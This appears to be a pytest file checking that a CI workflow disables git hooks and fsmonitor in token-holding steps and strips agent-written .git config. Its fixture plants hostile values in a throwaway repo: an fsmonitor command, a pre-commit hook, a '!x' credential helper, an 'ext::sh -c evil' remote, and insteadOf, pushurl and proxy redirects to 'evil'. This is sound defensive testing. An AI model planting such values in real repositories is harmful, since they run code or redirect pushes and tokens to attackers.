"""ADR-036: git runs with hooks off in every step that holds the token, and the reset steps strip anything an agent
wrote into .git/. Fixtures only: the reset script runs against a throwaway repository, no network."""
import os
import re
import shutil
import subprocess
from pathlib import Path

import pytest
import yaml

WORKFLOW = Path(__file__).resolve().parent.parent / ".github" / "workflows" / "sdlc.yml"
WRAPPER = 'git() { command git -c core.hooksPath=/dev/null -c core.fsmonitor=false "$@"; }'
GIT_CALL = re.compile(r"(?<![\w./$:-])git\s+[a-z]")                  # a git command, not a path or a URL


def steps():
    sts = yaml.safe_load(WORKFLOW.read_text())["jobs"]["stage"]["steps"]
    for s in sts:
        s.setdefault("name", s.get("uses", ""))
    return sts


def code(run):
    return "\n".join(l for l in run.splitlines() if not l.lstrip().startswith("#"))


def token_steps():
    return [s for s in steps() if "GH_TOKEN" in (s.get("env") or {})]


def reset_steps():
    return [s for s in steps() if s["name"].startswith("Remove the token the action wrote")]


def test_every_git_call_in_a_token_step_goes_through_the_hooks_off_wrapper():
    used = 0
    for s in token_steps():
        run = code(s["run"])
        calls = [m.start() for m in GIT_CALL.finditer(run.replace(WRAPPER, " " * len(WRAPPER)))]
        if calls:
            used += 1
            assert WRAPPER in run, s["name"]
            assert run.index(WRAPPER) < min(calls), s["name"]       # defined before the first git call
    assert used == 2          # the fetch step and the push step


def test_token_steps_ignore_the_global_and_system_git_config():
    for s in token_steps():
        assert s["env"]["GIT_CONFIG_GLOBAL"] == "/dev/null" and s["env"]["GIT_CONFIG_NOSYSTEM"] == "1", s["name"]


def test_the_job_turns_hooks_and_fsmonitor_off_for_every_git_call():
    env = yaml.safe_load(WORKFLOW.read_text())["jobs"]["stage"]["env"]
    pairs = {env[f"GIT_CONFIG_KEY_{i}"]: env[f"GIT_CONFIG_VALUE_{i}"] for i in range(int(env["GIT_CONFIG_COUNT"]))}
    assert pairs == {"core.hooksPath": "/dev/null", "core.fsmonitor": "false"}


def test_the_reset_steps_unset_the_dangerous_keys_and_empty_the_hooks_before_the_push():
    names = [s["name"] for s in steps()]
    resets = reset_steps()
    assert len(resets) == 2
    for s in resets:
        run = s["run"]
        for needle in ("core.fsmonitor", "core.hooksPath", "include.path", "--remove-section include",
                       "rm -rf .git/hooks", "config.worktree", "remote.origin.url"):
            assert needle in run, (s["name"], needle)
    assert names.index(resets[0]["name"]) < [i for i, n in enumerate(names) if n.startswith("Commit and push")][0]


def poisoned_repo(tmp_path):
    g = lambda *a: subprocess.run(["git", *a], cwd=tmp_path, check=True, capture_output=True, text=True)  # noqa: E731
    g("init", "-q")
    g("remote", "add", "origin", "https://x-access-token:fixture@github.com/o/r.git")
    (tmp_path / "inc").write_text("[core]\n fsmonitor = touch pwned\n")
    bad = [("core.fsmonitor", "touch pwned"), ("core.hooksPath", "/x"), ("include.path", "inc"),
           ("includeIf.gitdir:/.path", "inc"), ("url.https://evil/.insteadOf", "https://github.com/"),
           ("credential.helper", "!x"), ("filter.a.clean", "x"), ("alias.s", "!x"), ("diff.external", "x"),
           ("core.worktree", "/"), ("core.pager", "x"), ("http.proxy", "http://evil"),
           ("extensions.worktreeConfig", "true"), ("remote.origin.pushurl", "https://evil/")]
    for k, v in bad:
        g("config", "--local", "--add", k, v)
    g("config", "--local", "--add", "remote.origin.url", "ext::sh -c evil")
    g("config", "--local", "branch.main.remote", "origin")
    g("config", "--local", "user.name", "x")
    (tmp_path / ".git" / "hooks" / "pre-commit").write_text("#!/bin/sh\ntouch pwned\n")
    (tmp_path / ".git" / "config.worktree").write_text("[core]\n")
    return [k for k, _ in bad]


@pytest.mark.parametrize("which", [0, 1])
def test_a_reset_step_strips_an_agent_written_git_config(tmp_path, which):
    if not shutil.which("git") or not shutil.which("bash"):
        pytest.skip("needs git and bash")
    bad = poisoned_repo(tmp_path)
    env = {**os.environ, "GITHUB_REPOSITORY": "o/r", "GIT_CONFIG_GLOBAL": "/dev/null", "GIT_CONFIG_NOSYSTEM": "1"}
    subprocess.run(["bash", "-eo", "pipefail", "-c", reset_steps()[which]["run"]], cwd=tmp_path, env=env, check=True,
                   capture_output=True)
    keys = subprocess.run(["git", "config", "--local", "--name-only", "--list"], cwd=tmp_path, capture_output=True,
                          text=True, check=True).stdout.lower().split()
    for k in bad:
        assert k.lower() not in keys, k
    assert not any(k.startswith(("include", "url.", "credential.", "filter.", "alias.", "http.")) for k in keys)
    url = subprocess.run(["git", "config", "--local", "--get-all", "remote.origin.url"], cwd=tmp_path,
                         capture_output=True, text=True, check=True).stdout.split()
    assert url == ["https://github.com/o/r.git"]
    assert {"branch.main.remote", "user.name", "remote.origin.fetch"} <= set(keys)
    assert os.listdir(tmp_path / ".git" / "hooks") == [] and not (tmp_path / ".git" / "config.worktree").exists()
